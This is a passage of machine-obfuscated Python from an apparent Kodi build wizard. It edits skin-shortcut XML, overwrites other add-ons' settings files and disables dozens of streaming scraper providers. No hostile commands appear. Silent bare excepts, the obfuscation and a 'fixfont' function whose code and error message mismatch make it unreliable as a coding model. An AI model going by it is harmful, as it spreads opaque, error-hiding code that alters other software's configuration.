	</shortcut>''')#line:1229
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1232
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1233
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1237
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1238
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1239
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1257
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1260
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1261
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1265
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1266
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1267
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1285
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1288
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1289
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1292
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1293
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1294
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1312
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1315
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1316
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1318
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1319
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1320
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1338
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1341
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1342
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1344
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1345
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1346
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1364
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1367
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1368
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1371
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1372
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1373
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1391
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1394
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1395
def rdbuildinstallON ():#line:1398
    try :#line:1400
       OO0O0OOO0000OO000 =ADDONPATH +"/resources/rd/victory.xml"#line:1401
       O0O0O00OO0O00OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1402
       copyfile (OO0O0OOO0000OO000 ,O0O0O00OO0O00OO0O )#line:1404
       OO0O0OOO0000OO000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1406
       O0O0O00OO0O00OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1407
       copyfile (OO0O0OOO0000OO000 ,O0O0O00OO0O00OO0O )#line:1409
       OO0O0OOO0000OO000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1411
       O0O0O00OO0O00OO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1412
       copyfile (OO0O0OOO0000OO000 ,O0O0O00OO0O00OO0O )#line:1414
       OO0O0OOO0000OO000 =ADDONPATH +"/resources/rd/Splash.png"#line:1417
       O0O0O00OO0O00OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1418
       copyfile (OO0O0OOO0000OO000 ,O0O0O00OO0O00OO0O )#line:1420
    except :#line:1422
       pass #line:1423
def rdbuild ():#line:1433
	OOOOOO0OO00O0O0O0 =(ADDON .getSetting ("auto_rd"))#line:1434
	if OOOOOO0OO00O0O0O0 =='true':#line:1435
		O0OO0OO0O00OOO0OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1436
		O0OO0OO0O00OOO0OO .setSetting ('all_t','0')#line:1437
		O0OO0OO0O00OOO0OO .setSetting ('rd_menu_enable','false')#line:1438
		O0OO0OO0O00OOO0OO .setSetting ('magnet_bay','false')#line:1439
		O0OO0OO0O00OOO0OO .setSetting ('magnet_extra','false')#line:1440
		O0OO0OO0O00OOO0OO .setSetting ('rd_only','false')#line:1441
		O0OO0OO0O00OOO0OO .setSetting ('ftp','false')#line:1443
		O0OO0OO0O00OOO0OO .setSetting ('fp','false')#line:1444
		O0OO0OO0O00OOO0OO .setSetting ('filter_fp','false')#line:1445
		O0OO0OO0O00OOO0OO .setSetting ('fp_size_en','false')#line:1446
		O0OO0OO0O00OOO0OO .setSetting ('afdah','false')#line:1447
		O0OO0OO0O00OOO0OO .setSetting ('ap2s','false')#line:1448
		O0OO0OO0O00OOO0OO .setSetting ('cin','false')#line:1449
		O0OO0OO0O00OOO0OO .setSetting ('clv','false')#line:1450
		O0OO0OO0O00OOO0OO .setSetting ('cmv','false')#line:1451
		O0OO0OO0O00OOO0OO .setSetting ('dl20','false')#line:1452
		O0OO0OO0O00OOO0OO .setSetting ('esc','false')#line:1453
		O0OO0OO0O00OOO0OO .setSetting ('extra','false')#line:1454
		O0OO0OO0O00OOO0OO .setSetting ('film','false')#line:1455
		O0OO0OO0O00OOO0OO .setSetting ('fre','false')#line:1456
		O0OO0OO0O00OOO0OO .setSetting ('fxy','false')#line:1457
		O0OO0OO0O00OOO0OO .setSetting ('genv','false')#line:1458
		O0OO0OO0O00OOO0OO .setSetting ('getgo','false')#line:1459
		O0OO0OO0O00OOO0OO .setSetting ('gold','false')#line:1460
		O0OO0OO0O00OOO0OO .setSetting ('gona','false')#line:1461
		O0OO0OO0O00OOO0OO .setSetting ('hdmm','false')#line:1462
		O0OO0OO0O00OOO0OO .setSetting ('hdt','false')#line:1463
		O0OO0OO0O00OOO0OO .setSetting ('icy','false')#line:1464
		O0OO0OO0O00OOO0OO .setSetting ('ind','false')#line:1465
		O0OO0OO0O00OOO0OO .setSetting ('iwi','false')#line:1466
		O0OO0OO0O00OOO0OO .setSetting ('jen_free','false')#line:1467
		O0OO0OO0O00OOO0OO .setSetting ('kiss','false')#line:1468
		O0OO0OO0O00OOO0OO .setSetting ('lavin','false')#line:1469
		O0OO0OO0O00OOO0OO .setSetting ('los','false')#line:1470
		O0OO0OO0O00OOO0OO .setSetting ('m4u','false')#line:1471
		O0OO0OO0O00OOO0OO .setSetting ('mesh','false')#line:1472
		O0OO0OO0O00OOO0OO .setSetting ('mf','false')#line:1473
		O0OO0OO0O00OOO0OO .setSetting ('mkvc','false')#line:1474
		O0OO0OO0O00OOO0OO .setSetting ('mjy','false')#line:1475
		O0OO0OO0O00OOO0OO .setSetting ('hdonline','false')#line:1476
		O0OO0OO0O00OOO0OO .setSetting ('moviex','false')#line:1477
		O0OO0OO0O00OOO0OO .setSetting ('mpr','false')#line:1478
		O0OO0OO0O00OOO0OO .setSetting ('mvg','false')#line:1479
		O0OO0OO0O00OOO0OO .setSetting ('mvl','false')#line:1480
		O0OO0OO0O00OOO0OO .setSetting ('mvs','false')#line:1481
		O0OO0OO0O00OOO0OO .setSetting ('myeg','false')#line:1482
		O0OO0OO0O00OOO0OO .setSetting ('ninja','false')#line:1483
		O0OO0OO0O00OOO0OO .setSetting ('odb','false')#line:1484
		O0OO0OO0O00OOO0OO .setSetting ('ophd','false')#line:1485
		O0OO0OO0O00OOO0OO .setSetting ('pks','false')#line:1486
		O0OO0OO0O00OOO0OO .setSetting ('prf','false')#line:1487
		O0OO0OO0O00OOO0OO .setSetting ('put18','false')#line:1488
		O0OO0OO0O00OOO0OO .setSetting ('req','false')#line:1489
		O0OO0OO0O00OOO0OO .setSetting ('rftv','false')#line:1490
		O0OO0OO0O00OOO0OO .setSetting ('rltv','false')#line:1491
		O0OO0OO0O00OOO0OO .setSetting ('sc','false')#line:1492
		O0OO0OO0O00OOO0OO .setSetting ('seehd','false')#line:1493
		O0OO0OO0O00OOO0OO .setSetting ('showbox','false')#line:1494
		O0OO0OO0O00OOO0OO .setSetting ('shuid','false')#line:1495
		O0OO0OO0O00OOO0OO .setSetting ('sil_gh','false')#line:1496
		O0OO0OO0O00OOO0OO .setSetting ('spv','false')#line:1497
		O0OO0OO0O00OOO0OO .setSetting ('subs','false')#line:1498
		O0OO0OO0O00OOO0OO .setSetting ('tvs','false')#line:1499
		O0OO0OO0O00OOO0OO .setSetting ('tw','false')#line:1500
		O0OO0OO0O00OOO0OO .setSetting ('upto','false')#line:1501
		O0OO0OO0O00OOO0OO .setSetting ('vel','false')#line:1502
		O0OO0OO0O00OOO0OO .setSetting ('vex','false')#line:1503
		O0OO0OO0O00OOO0OO .setSetting ('vidc','false')#line:1504
		O0OO0OO0O00OOO0OO .setSetting ('w4hd','false')#line:1505
		O0OO0OO0O00OOO0OO .setSetting ('wav','false')#line:1506
		O0OO0OO0O00OOO0OO .setSetting ('wf','false')#line:1507
		O0OO0OO0O00OOO0OO .setSetting ('wse','false')#line:1508
		O0OO0OO0O00OOO0OO .setSetting ('wss','false')#line:1509
		O0OO0OO0O00OOO0OO .setSetting ('wsse','false')#line:1510
		O0OO0OO0O00OOO0OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1511
		O0OO0OO0O00OOO0OO .setSetting ('debrid.only','true')#line:1512
		O0OO0OO0O00OOO0OO .setSetting ('hosts.captcha','false')#line:1513
		O0OO0OO0O00OOO0OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1514
		O0OO0OO0O00OOO0OO .setSetting ('provider.123moviehd','false')#line:1515
		O0OO0OO0O00OOO0OO .setSetting ('provider.300mbdownload','false')#line:1516
		O0OO0OO0O00OOO0OO .setSetting ('provider.alltube','false')#line:1517
		O0OO0OO0O00OOO0OO .setSetting ('provider.allucde','false')#line:1518
		O0OO0OO0O00OOO0OO .setSetting ('provider.animebase','false')#line:1519
		O0OO0OO0O00OOO0OO .setSetting ('provider.animeloads','false')#line:1520
		O0OO0OO0O00OOO0OO .setSetting ('provider.animetoon','false')#line:1521
		O0OO0OO0O00OOO0OO .setSetting ('provider.bnwmovies','false')#line:1522
		O0OO0OO0O00OOO0OO .setSetting ('provider.boxfilm','false')#line:1523
		O0OO0OO0O00OOO0OO .setSetting ('provider.bs','false')#line:1524
		O0OO0OO0O00OOO0OO .setSetting ('provider.cartoonhd','false')#line:1525
		O0OO0OO0O00OOO0OO .setSetting ('provider.cdahd','false')#line:1526
		O0OO0OO0O00OOO0OO .setSetting ('provider.cdax','false')#line:1527
		O0OO0OO0O00OOO0OO .setSetting ('provider.cine','false')#line:1528
		O0OO0OO0O00OOO0OO .setSetting ('provider.cinenator','false')#line:1529
		O0OO0OO0O00OOO0OO .setSetting ('provider.cmovieshdbz','false')#line:1530
		O0OO0OO0O00OOO0OO .setSetting ('provider.coolmoviezone','false')#line:1531
		O0OO0OO0O00OOO0OO .setSetting ('provider.ddl','false')#line:1532
		O0OO0OO0O00OOO0OO .setSetting ('provider.deepmovie','false')#line:1533
		O0OO0OO0O00OOO0OO .setSetting ('provider.ekinomaniak','false')#line:1534
		O0OO0OO0O00OOO0OO .setSetting ('provider.ekinotv','false')#line:1535
		O0OO0OO0O00OOO0OO .setSetting ('provider.filiser','false')#line:1536
		O0OO0OO0O00OOO0OO .setSetting ('provider.filmpalast','false')#line:1537
		O0OO0OO0O00OOO0OO .setSetting ('provider.filmwebbooster','false')#line:1538
		O0OO0OO0O00OOO0OO .setSetting ('provider.filmxy','false')#line:1539
		O0OO0OO0O00OOO0OO .setSetting ('provider.fmovies','false')#line:1540
		O0OO0OO0O00OOO0OO .setSetting ('provider.foxx','false')#line:1541
		O0OO0OO0O00OOO0OO .setSetting ('provider.freefmovies','false')#line:1542
		O0OO0OO0O00OOO0OO .setSetting ('provider.freeputlocker','false')#line:1543
		O0OO0OO0O00OOO0OO .setSetting ('provider.furk','false')#line:1544
		O0OO0OO0O00OOO0OO .setSetting ('provider.gamatotv','false')#line:1545
		O0OO0OO0O00OOO0OO .setSetting ('provider.gogoanime','false')#line:1546
		O0OO0OO0O00OOO0OO .setSetting ('provider.gowatchseries','false')#line:1547
		O0OO0OO0O00OOO0OO .setSetting ('provider.hackimdb','false')#line:1548
		O0OO0OO0O00OOO0OO .setSetting ('provider.hdfilme','false')#line:1549
		O0OO0OO0O00OOO0OO .setSetting ('provider.hdmto','false')#line:1550
		O0OO0OO0O00OOO0OO .setSetting ('provider.hdpopcorns','false')#line:1551
		O0OO0OO0O00OOO0OO .setSetting ('provider.hdstreams','false')#line:1552
		O0OO0OO0O00OOO0OO .setSetting ('provider.horrorkino','false')#line:1554
		O0OO0OO0O00OOO0OO .setSetting ('provider.iitv','false')#line:1555
		O0OO0OO0O00OOO0OO .setSetting ('provider.iload','false')#line:1556
		O0OO0OO0O00OOO0OO .setSetting ('provider.iwaatch','false')#line:1557
		O0OO0OO0O00OOO0OO .setSetting ('provider.kinodogs','false')#line:1558
		O0OO0OO0O00OOO0OO .setSetting ('provider.kinoking','false')#line:1559
		O0OO0OO0O00OOO0OO .setSetting ('provider.kinow','false')#line:1560
		O0OO0OO0O00OOO0OO .setSetting ('provider.kinox','false')#line:1561
		O0OO0OO0O00OOO0OO .setSetting ('provider.lichtspielhaus','false')#line:1562
		O0OO0OO0O00OOO0OO .setSetting ('provider.liomenoi','false')#line:1563
		O0OO0OO0O00OOO0OO .setSetting ('provider.magnetdl','false')#line:1566
		O0OO0OO0O00OOO0OO .setSetting ('provider.megapelistv','false')#line:1567
		O0OO0OO0O00OOO0OO .setSetting ('provider.movie2k-ac','false')#line:1568
		O0OO0OO0O00OOO0OO .setSetting ('provider.movie2k-ag','false')#line:1569
		O0OO0OO0O00OOO0OO .setSetting ('provider.movie2z','false')#line:1570
		O0OO0OO0O00OOO0OO .setSetting ('provider.movie4k','false')#line:1571
		O0OO0OO0O00OOO0OO .setSetting ('provider.movie4kis','false')#line:1572
		O0OO0OO0O00OOO0OO .setSetting ('provider.movieneo','false')#line:1573
		O0OO0OO0O00OOO0OO .setSetting ('provider.moviesever','false')#line:1574
		O0OO0OO0O00OOO0OO .setSetting ('provider.movietown','false')#line:1575
		O0OO0OO0O00OOO0OO .setSetting ('provider.mvrls','false')#line:1577
		O0OO0OO0O00OOO0OO .setSetting ('provider.netzkino','false')#line:1578
		O0OO0OO0O00OOO0OO .setSetting ('provider.odb','false')#line:1579
		O0OO0OO0O00OOO0OO .setSetting ('provider.openkatalog','false')#line:1580
		O0OO0OO0O00OOO0OO .setSetting ('provider.ororo','false')#line:1581
		O0OO0OO0O00OOO0OO .setSetting ('provider.paczamy','false')#line:1582
		O0OO0OO0O00OOO0OO .setSetting ('provider.peliculasdk','false')#line:1583
		O0OO0OO0O00OOO0OO .setSetting ('provider.pelisplustv','false')#line:1584
		O0OO0OO0O00OOO0OO .setSetting ('provider.pepecine','false')#line:1585
		O0OO0OO0O00OOO0OO .setSetting ('provider.primewire','false')#line:1586
		O0OO0OO0O00OOO0OO .setSetting ('provider.projectfreetv','false')#line:1587
		O0OO0OO0O00OOO0OO .setSetting ('provider.proxer','false')#line:1588
		O0OO0OO0O00OOO0OO .setSetting ('provider.pureanime','false')#line:1589
		O0OO0OO0O00OOO0OO .setSetting ('provider.putlocker','false')#line:1590
		O0OO0OO0O00OOO0OO .setSetting ('provider.putlockerfree','false')#line:1591
		O0OO0OO0O00OOO0OO .setSetting ('provider.reddit','false')#line:1592
		O0OO0OO0O00OOO0OO .setSetting ('provider.cartoonwire','false')#line:1593
		O0OO0OO0O00OOO0OO .setSetting ('provider.seehd','false')#line:1594
		O0OO0OO0O00OOO0OO .setSetting ('provider.segos','false')#line:1595
		O0OO0OO0O00OOO0OO .setSetting ('provider.serienstream','false')#line:1596
		O0OO0OO0O00OOO0OO .setSetting ('provider.series9','false')#line:1597
		O0OO0OO0O00OOO0OO .setSetting ('provider.seriesever','false')#line:1598
		O0OO0OO0O00OOO0OO .setSetting ('provider.seriesonline','false')#line:1599
		O0OO0OO0O00OOO0OO .setSetting ('provider.seriespapaya','false')#line:1600
		O0OO0OO0O00OOO0OO .setSetting ('provider.sezonlukdizi','false')#line:1601
		O0OO0OO0O00OOO0OO .setSetting ('provider.solarmovie','false')#line:1602
		O0OO0OO0O00OOO0OO .setSetting ('provider.solarmoviez','false')#line:1603
		O0OO0OO0O00OOO0OO .setSetting ('provider.stream-to','false')#line:1604
		O0OO0OO0O00OOO0OO .setSetting ('provider.streamdream','false')#line:1605
		O0OO0OO0O00OOO0OO .setSetting ('provider.streamflix','false')#line:1606
		O0OO0OO0O00OOO0OO .setSetting ('provider.streamit','false')#line:1607
		O0OO0OO0O00OOO0OO .setSetting ('provider.swatchseries','false')#line:1608
		O0OO0OO0O00OOO0OO .setSetting ('provider.szukajkatv','false')#line:1609
		O0OO0OO0O00OOO0OO .setSetting ('provider.tainiesonline','false')#line:1610
		O0OO0OO0O00OOO0OO .setSetting ('provider.tainiomania','false')#line:1611
		O0OO0OO0O00OOO0OO .setSetting ('provider.tata','false')#line:1614
		O0OO0OO0O00OOO0OO .setSetting ('provider.trt','false')#line:1615
		O0OO0OO0O00OOO0OO .setSetting ('provider.tvbox','false')#line:1616
		O0OO0OO0O00OOO0OO .setSetting ('provider.ultrahd','false')#line:1617
		O0OO0OO0O00OOO0OO .setSetting ('provider.video4k','false')#line:1618
		O0OO0OO0O00OOO0OO .setSetting ('provider.vidics','false')#line:1619
		O0OO0OO0O00OOO0OO .setSetting ('provider.view4u','false')#line:1620
		O0OO0OO0O00OOO0OO .setSetting ('provider.watchseries','false')#line:1621
		O0OO0OO0O00OOO0OO .setSetting ('provider.xrysoi','false')#line:1622
		O0OO0OO0O00OOO0OO .setSetting ('provider.library','false')#line:1623
def fixfont ():#line:1626
	OO0O0OOOO0O00000O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1627
	OOO00000OO000O000 =json .loads (OO0O0OOOO0O00000O );#line:1629
	O00OOO000OO0O0OO0 =OOO00000OO000O000 ["result"]["settings"]#line:1630
	OOO000O0O0OOOO00O =[OO0OO00O0OOO0O0OO for OO0OO00O0OOO0O0OO in O00OOO000OO0O0OO0 if OO0OO00O0OOO0O0OO ["id"]=="audiooutput.audiodevice"][0 ]#line:1632
	O0OO0OO00OO00O0OO =OOO000O0O0OOOO00O ["options"];#line:1633
	OO00OO0O0OOO000O0 =OOO000O0O0OOOO00O ["value"];#line:1634
	OOO0O00OOO00O0000 =[O0O0000O0000OOO00 for (O0O0000O0000OOO00 ,OO0OO000O0OO00000 )in enumerate (O0OO0OO00OO00O0OO )if OO0OO000O0OO00000 ["value"]==OO00OO0O0OOO000O0 ][0 ];#line:1636
	OOOO0O0O0OO0OO000 =(OOO0O00OOO00O0000 +1 )%len (O0OO0OO00OO00O0OO )#line:1638
	O000OOO00OO000OO0 =O0OO0OO00OO00O0OO [OOOO0O0O0OO0OO000 ]["value"]#line:1640
	O00OO000OO00OOO0O =O0OO0OO00OO00O0OO [OOOO0O0O0OO0OO000 ]["label"]#line:1641
	O000O0000O0OOO00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1643
	try :#line:1645
		O00OO0O00O0OO00OO =json .loads (O000O0000O0OOO00O );#line:1646
		if O00OO0O00O0OO00OO ["result"]!=True :#line:1648
			raise Exception #line:1649
	except :#line:1650
		sys .stderr .write ("Error switching audio output device")#line:1651
		raise Exception #line:1652
def parseDOM2 (O00OOO0O000O0O0O0 ,name =u"",attrs ={},ret =False ):#line:1653
	if isinstance (O00OOO0O000O0O0O0 ,str ):#line:1656
		try :#line:1657
			O00OOO0O000O0O0O0 =[O00OOO0O000O0O0O0 .decode ("utf-8")]#line:1658
		except :#line:1659
			O00OOO0O000O0O0O0 =[O00OOO0O000O0O0O0 ]#line:1660
	elif isinstance (O00OOO0O000O0O0O0 ,unicode ):#line:1661
		O00OOO0O000O0O0O0 =[O00OOO0O000O0O0O0 ]#line:1662
	elif not isinstance (O00OOO0O000O0O0O0 ,list ):#line:1663
		return u""#line:1664
	if not name .strip ():#line:1666
		return u""#line:1667
	OOO000OO0O0000O00 =[]#line:1669
	for O00OO000O0OO0OOOO in O00OOO0O000O0O0O0 :#line:1670
		O0O00OOOOO0OO0O0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00OO000O0OO0OOOO )#line:1671
		for OOO00OOOOO0O0OOO0 in O0O00OOOOO0OO0O0O :#line:1672
			O00OO000O0OO0OOOO =O00OO000O0OO0OOOO .replace (OOO00OOOOO0O0OOO0 ,OOO00OOOOO0O0OOO0 .replace ("\n"," "))#line:1673
		O0O00O000O00OO000 =[]#line:1675
		for OOOOOOOOO0O0O000O in attrs :#line:1676
			O00O000OO00000OOO =re .compile ('(<'+name +'[^>]*?(?:'+OOOOOOOOO0O0O000O +'=[\'"]'+attrs [OOOOOOOOO0O0O000O ]+'[\'"].*?>))',re .M |re .S ).findall (O00OO000O0OO0OOOO )#line:1677
			if len (O00O000OO00000OOO )==0 and attrs [OOOOOOOOO0O0O000O ].find (" ")==-1 :#line:1678
				O00O000OO00000OOO =re .compile ('(<'+name +'[^>]*?(?:'+OOOOOOOOO0O0O000O +'='+attrs [OOOOOOOOO0O0O000O ]+'.*?>))',re .M |re .S ).findall (O00OO000O0OO0OOOO )#line:1679
			if len (O0O00O000O00OO000 )==0 :#line:1681
				O0O00O000O00OO000 =O00O000OO00000OOO #line:1682
				O00O000OO00000OOO =[]#line:1683
			else :#line:1684
				OO0OO0OOOO0000000 =range (len (O0O00O000O00OO000 ))#line:1685
				OO0OO0OOOO0000000 .reverse ()#line:1686
				for O0O00O0O0O0OOOO00 in OO0OO0OOOO0000000 :#line:1687
					if not O0O00O000O00OO000 [O0O00O0O0O0OOOO00 ]in O00O000OO00000OOO :#line:1688
						del (O0O00O000O00OO000 [O0O00O0O0O0OOOO00 ])#line:1689
		if len (O0O00O000O00OO000 )==0 and attrs =={}:#line:1691
			O0O00O000O00OO000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00OO000O0OO0OOOO )#line:1692
			if len (O0O00O000O00OO000 )==0 :#line:1693
				O0O00O000O00OO000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00OO000O0OO0OOOO )#line:1694
		if isinstance (ret ,str ):#line:1696
			O00O000OO00000OOO =[]#line:1697
			for OOO00OOOOO0O0OOO0 in O0O00O000O00OO000 :#line:1698
				O000OO000O000O00O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO00OOOOO0O0OOO0 )#line:1699
				if len (O000OO000O000O00O )==0 :#line:1700
					O000OO000O000O00O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO00OOOOO0O0OOO0 )#line:1701
				for OO0O0O000O0O00O00 in O000OO000O000O00O :#line:1702
					O00O0O000OO000OO0 =OO0O0O000O0O00O00 [0 ]#line:1703
					if O00O0O000OO000OO0 in "'\"":#line:1704
						if OO0O0O000O0O00O00 .find ('='+O00O0O000OO000OO0 ,OO0O0O000O0O00O00 .find (O00O0O000OO000OO0 ,1 ))>-1 :#line:1705
							OO0O0O000O0O00O00 =OO0O0O000O0O00O00 [:OO0O0O000O0O00O00 .find ('='+O00O0O000OO000OO0 ,OO0O0O000O0O00O00 .find (O00O0O000OO000OO0 ,1 ))]#line:1706
						if OO0O0O000O0O00O00 .rfind (O00O0O000OO000OO0 ,1 )>-1 :#line:1708
							OO0O0O000O0O00O00 =OO0O0O000O0O00O00 [1 :OO0O0O000O0O00O00 .rfind (O00O0O000OO000OO0 )]#line:1709
					else :#line:1710
						if OO0O0O000O0O00O00 .find (" ")>0 :#line:1711
							OO0O0O000O0O00O00 =OO0O0O000O0O00O00 [:OO0O0O000O0O00O00 .find (" ")]#line:1712
						elif OO0O0O000O0O00O00 .find ("/")>0 :#line:1713
							OO0O0O000O0O00O00 =OO0O0O000O0O00O00 [:OO0O0O000O0O00O00 .find ("/")]#line:1714
						elif OO0O0O000O0O00O00 .find (">")>0 :#line:1715
